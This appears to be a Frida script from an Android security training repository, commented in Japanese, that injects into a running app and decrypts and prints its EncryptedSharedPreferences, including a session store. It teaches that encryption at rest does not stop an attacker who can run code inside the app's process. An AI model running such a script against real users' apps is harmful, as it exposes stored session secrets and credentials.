/*
 * 第1章 Deep (手順11) — 暗号化された shared_prefs をアプリの中から読む。
 *
 *   (被害者アプリを前面に出した状態で、リポジトリのルートから)
 *   frida -U -F -l tools/frida/ch1-read-encrypted-prefs.js
 *
 * 何をしているか:
 *   アプリ自身のコンテキストで EncryptedSharedPreferences を開き直しているだけ。
 *   鍵は Keystore の中にあり、こちらは一度も鍵の中身を見ていない。
 *   それでも平文が出る。
 *
 * ここで確認すること:
 *   ファイルを取り出す攻撃 (adb pull やバックアップ) は暗号化で止まった。
 *   だがアプリのプロセスとして動ける攻撃者には止まっていない。
 *   → 保存時の暗号化が消すのは «オフラインで取得したファイルだけを持つ» 相手であって、
 *     端末上で動ける root 攻撃者は、ここからプロセス内実行へ進める。
 */
Java.perform(function () {
    var ActivityThread = Java.use('android.app.ActivityThread');
    var context = ActivityThread.currentApplication().getApplicationContext();

    var MasterKeyBuilder = Java.use('androidx.security.crypto.MasterKey$Builder');
    var KeyScheme = Java.use('androidx.security.crypto.MasterKey$KeyScheme');
    var ESP = Java.use('androidx.security.crypto.EncryptedSharedPreferences');
    var PrefKeyScheme = Java.use('androidx.security.crypto.EncryptedSharedPreferences$PrefKeyEncryptionScheme');
    var PrefValueScheme = Java.use('androidx.security.crypto.EncryptedSharedPreferences$PrefValueEncryptionScheme');

    var masterKey = MasterKeyBuilder.$new(context)
        .setKeyScheme(KeyScheme.AES256_GCM.value)
        .build();

    ['user_session_secure', 'fix_d'].forEach(function (name) {
        try {
            var prefs = ESP.create(
                context, name, masterKey,
                PrefKeyScheme.AES256_SIV.value,
                PrefValueScheme.AES256_GCM.value
            );
            var all = prefs.getAll();
            console.log('\n=== ' + name + ' (復号済み) ===');
            var it = all.keySet().iterator();
            while (it.hasNext()) {
                var k = it.next();
                console.log('  ' + k + ' = ' + all.get(k));
            }
        } catch (e) {
            console.log('[' + name + '] 読めず: ' + e);
        }
    });
});
